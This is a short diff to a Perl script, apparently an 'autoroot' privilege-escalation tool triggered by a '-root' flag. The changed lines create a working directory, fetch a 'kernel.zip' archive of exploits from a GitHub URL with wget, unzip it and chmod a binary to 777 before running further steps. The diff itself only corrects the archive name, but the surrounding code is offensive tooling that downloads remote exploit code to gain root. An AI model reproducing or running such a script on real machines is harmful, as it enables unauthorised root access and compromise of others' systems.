@@ -16,7 +16,7 @@ if ($ARGV[0] eq "-root")
 system("mkdir elcrush");
 chdir("elcrush");
 system("wget https://github.com/frishella/autoroot/tree/master/Desktop/kernel.zip");
-system("unzip local.zip;ls -al");
+system("unzip kernel.zip;ls -al");
 chdir("2001");
 system("ls -a");
 system("chmod 777 2k");
